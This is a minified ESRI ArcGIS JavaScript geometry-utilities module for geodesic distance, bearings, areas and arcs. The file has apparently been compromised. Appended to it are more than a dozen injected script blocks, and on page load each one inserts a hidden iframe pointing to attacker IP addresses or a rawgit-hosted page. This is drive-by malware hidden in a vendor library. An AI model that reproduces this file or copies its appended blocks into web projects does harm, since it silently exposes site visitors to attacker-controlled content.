// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("esri/geometry/Point esri/geometry/Polyline esri/geometry/Polygon esri/geometry/webMercatorUtils dojo/Deferred dojo/_base/array dojo/_base/lang esri/geometry/geometryEngine esri/SpatialReference esri/geometry/scaleUtils".split(" "),function(B,x,y,l,C,D,z,f,w,E){var g={getProjectedGeometry:function(b,a,c){var e,d;e=new C;l.canProject(b,a)?(d=l.project(b,a),e.resolve(d)):c.project([b],a,function(a){d=a[0];e.resolve(d)});return e.promise},getDestinationPoint:function(b,a,c){var e=b.x*Math.PI/
180,d=a*Math.PI/180;a=Math.sin(d);var d=Math.cos(d),r=.9966471893352243*Math.tan(b.y*Math.PI/180);b=1/Math.sqrt(1+r*r);var f=r*b,g=Math.atan2(r,d),r=b*a,p=1-r*r,h=2.7233160610984375E11*p/4.040829998465916E13,A=1+h/16384*(4096+h*(-768+h*(320-175*h))),u=h/1024*(256+h*(-128+h*(74-47*h))),k,q,m,t=c/(6356752.314245*A),v,l=0;do h=Math.cos(2*g+t),k=Math.sin(t),q=Math.cos(t),m=u*k*(h+u/4*(q*(-1+2*h*h)-u/6*h*(-3+4*k*k)*(-3+4*h*h))),v=t,t=c/(6356752.314245*A)+m;while(1E-12<Math.abs(t-v)&&200>++l);if(200<=l)return console.error("Formula failed to converge"),
null;c=f*k-b*q*d;c=Math.atan2(f*q+b*k*d,.9966471893352243*Math.sqrt(r*r+c*c));p=2.0955066654848088E-4*p*(4+.003352810664775694*(4-3*p));e=(e+(Math.atan2(k*a,b*q-f*k*d)-.003352810664775694*(1-p)*r*(t+p*k*(h+p*q*(-1+2*h*h))))+3*Math.PI)%(2*Math.PI)-Math.PI;c=180*c/Math.PI;e=180*e/Math.PI;return new B(e,c,new w(4326))},getInverseCalculations:function(b,a){var c=a.x*Math.PI/180-b.x*Math.PI/180,e=.9966471893352243*Math.tan(b.y*Math.PI/180);b=1/Math.sqrt(1+e*e);var e=e*b,d=.9966471893352243*Math.tan(a.y*
Math.PI/180);a=1/Math.sqrt(1+d*d);var d=d*a,f,g,n,p,h,l,u,k,q,m=c,t,v=0;do{f=Math.sin(m);g=Math.cos(m);n=a*f*a*f+(b*d-e*a*g)*(b*d-e*a*g);n=Math.sqrt(n);if(0==n)return 0;p=e*d+b*a*g;h=Math.atan2(n,p);l=b*a*f/n;u=1-l*l;k=p-2*e*d/u;isNaN(k)&&(k=0);q=2.0955066654848088E-4*u*(4+.003352810664775694*(4-3*u));t=m;m=c+.003352810664775694*(1-q)*l*(h+q*n*(k+q*p*(-1+2*k*k)))}while(1E-12<Math.abs(m-t)&&200>++v);if(200<=v)return null;m=2.7233160610984375E11*u/4.040829998465916E13;v=m/1024*(256+m*(-128+m*(74-47*
m)));c=Math.atan2(a*f,b*d-e*a*g);b=Math.atan2(b*f,-e*a+b*d*g);c=(c+2*Math.PI)%(2*Math.PI);b=(b+2*Math.PI)%(2*Math.PI);e=Number((6356752.314245*(1+m/16384*(4096+m*(-768+m*(320-175*m))))*(h-v*n*(k+v/4*(p*(-1+2*k*k)-v/6*k*(-3+4*n*n)*(-3+4*k*k))))).toFixed(3));c=180*c/Math.PI;b=180*b/Math.PI;return{distance:e,initialBearing:c,finalBearing:b}},getLineBetweenPoints:function(b){var a,c=[];D.forEach(b,z.hitch(this,function(a){c.push([a.x,a.y])}));0<c.length&&(a=new x({paths:[c],spatialReference:{wkid:4326}}));
return a},getAngleBetweenPoints:function(b,a){b=g.getInverseCalculations(b,a);return null===b?0:b.initialBearing},getDistanceBetweenPoints:function(b,a){b=g.getInverseCalculations(b,a);return null===b?0:b.distance},getLengthOfGeometry:function(b){var a,c;a={};(c=f.simplify(b))?b.spatialReference.isWebMercator()||4326===b.spatialReference.wkid?(a.meters=f.geodesicLength(c,"meters"),a.miles=f.geodesicLength(c,"miles"),a.kilometers=f.geodesicLength(c,"kilometers"),a.feet=f.geodesicLength(c,"feet")):
(a.meters=f.planarLength(c,"meters"),a.miles=f.planarLength(c,"miles"),a.kilometers=f.planarLength(c,"kilometers"),a.feet=f.planarLength(c,"feet")):(a.meters=0,a.miles=0,a.kilometers=0,a.feet=0);return a},getAreaOfGeometry:function(b){var a,c;a=f.simplify(b);c={};a?b.spatialReference.isWebMercator()||4326===b.spatialReference.wkid?(c.acres=f.geodesicArea(a,"acres"),c.squareMeters=f.geodesicArea(a,"square-meters"),c.squareFeet=f.geodesicArea(a,"square-feet"),c.squareUsFeet=f.geodesicArea(a,109406),
c.squareKilometer=f.geodesicArea(a,"square-kilometers"),c.hectares=f.geodesicArea(a,"hectares")):(c.acres=f.planarArea(a,"acres"),c.squareMeters=f.planarArea(a,"square-meters"),c.squareFeet=f.planarArea(a,"square-feet"),c.squareUsFeet=f.planarArea(a,109406),c.squareKilometer=f.planarArea(a,"square-kilometers"),c.hectares=f.planarArea(a,"hectares")):(c.acres=0,c.squareMeters=0,c.squareFeet=0,c.squareUsFeet=0,c.squareKilometer=0,c.hectares=0);return c},getPolyLineFromPaths:function(b){var a,c;a=new x(new w({wkid:4326}));
for(c=0;c<b.length;c++)a.addPath(b[c]);return a},getPolygonFromPolyLines:function(b,a,c,e){var d,f,g;d=[];e=e?new y(new w(e)):new y(new w({wkid:4326}));for(f=0;f<b.length;f++)for(g=0;g<b[f].length;g++)d.push(b[f][g]);a?d.push(z.clone(d[0])):c&&(d[d.length-1][0]=d[0][0],d[d.length-1][1]=d[0][1]);e.isClockwise(d)||d.reverse();e.addRing(d);return e},getPointsForArc:function(b,a,c,e){var d,f=[],l,n;d=a-b;a=parseInt(d,10);0>=a&&(a=1);l=Math.abs(d)/Math.abs(a);if(0<l)for(d=0;d<Math.abs(a)+1;d++)n=b+l*d,
(n=g.getDestinationPoint(c,n,Math.abs(e)))&&f.push(n);return f},getArcParam:function(b){var a;a={};0>b.distance?0>b.radius?(a.bearing=b.initBearing+90,a.centerPoint=g.getDestinationPoint(b.chordMidPoint,a.bearing,b.centerAndChordDistance),a.startAngle=g.getAngleBetweenPoints(a.centerPoint,b.chordEndPoint),a.endAngle=g.getAngleBetweenPoints(a.centerPoint,b.chordStartPoint)):(a.bearing=b.initBearing-90,a.centerPoint=g.getDestinationPoint(b.chordMidPoint,a.bearing,b.centerAndChordDistance),a.startAngle=
g.getAngleBetweenPoints(a.centerPoint,b.chordStartPoint),a.endAngle=g.getAngleBetweenPoints(a.centerPoint,b.chordEndPoint)):0<b.radius?(a.bearing=b.initBearing+90,a.centerPoint=g.getDestinationPoint(b.chordMidPoint,a.bearing,b.centerAndChordDistance),a.startAngle=g.getAngleBetweenPoints(a.centerPoint,b.chordStartPoint),a.endAngle=g.getAngleBetweenPoints(a.centerPoint,b.chordEndPoint)):(a.bearing=b.initBearing-90,a.centerPoint=g.getDestinationPoint(b.chordMidPoint,a.bearing,b.centerAndChordDistance),
a.startAngle=g.getAngleBetweenPoints(a.centerPoint,b.chordEndPoint),a.endAngle=g.getAngleBetweenPoints(a.centerPoint,b.chordStartPoint));return a},removeNegativeExponents:function(b){return 1<b.toString().toLowerCase().split("e-").length?0:b},getChordLengthFromArcLength:function(b,a){var c;b=Math.abs(b);c=Math.PI*Math.abs(a);a=Math.abs(a)*Math.sin(Math.abs(b)/Math.abs(a)/2);return b<=c?2*a:-2*a},getArcLengthFromChordLength:function(b,a){var c;c=Math.abs(b);a=Math.abs(a);c=2*Math.asin(c/(2*a))*a;0>
b&&(c=2*Math.PI*a-c);return c},chordBearingToTangentBearing:function(b,a,c){var e;e=180/Math.PI*Math.acos(Math.abs(c)/2/Math.abs(a));a/=Math.abs(a);b=b+90*a-c/Math.abs(c)*a*e;return g.removeNegativeExponents(0>b?b+360:360<=b?b%360:b)},tangentBearingToChordBearing:function(b,a,c){var e;e=180/Math.PI*Math.acos(Math.abs(c)/2/Math.abs(a));a/=Math.abs(a);b=b+90*a-c/Math.abs(c)*a*e;return g.removeNegativeExponents(0>b?b+360:360<=b?b%360:b)},getUnitValueForSR:function(b){switch(E.getUnitValueForSR(b)){case 1:return"meters";
case 111194.87428468118:return"meters";case .3048:return"feet";case .3048006096:case .3048006096012192:return"uSSurveyFeet"}},getRotationAngleBetweenPoints:function(b,a){var c,e;b=l.project(b,new w(102100));a=l.project(a,new w(102100));c=a.x-b.x;b=a.y-b.y;a=180*Math.atan2(Math.abs(c),Math.abs(b))/Math.PI;e=180*Math.atan2(Math.abs(b),Math.abs(c))/Math.PI;c=g.removeNegativeExponents(c);b=g.removeNegativeExponents(b);a=g.removeNegativeExponents(a);e=g.removeNegativeExponents(e);if(0===b){if(0===c)return 0;
if(0<c)return 90;if(0>c)return 270}else if(0<b){if(0===c)return 0;if(0<c)return a;if(0>c)return 270+e}else if(0>b){if(0===c)return 180;if(0<c)return 90+e;if(0>c)return 180+a}},getScaleDistanceBetweenPoints:function(b,a){b=l.project(b,new w(102100));a=l.project(a,new w(102100));b=f.distance(b,a,9001);return g.removeNegativeExponents(b)}};return g});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});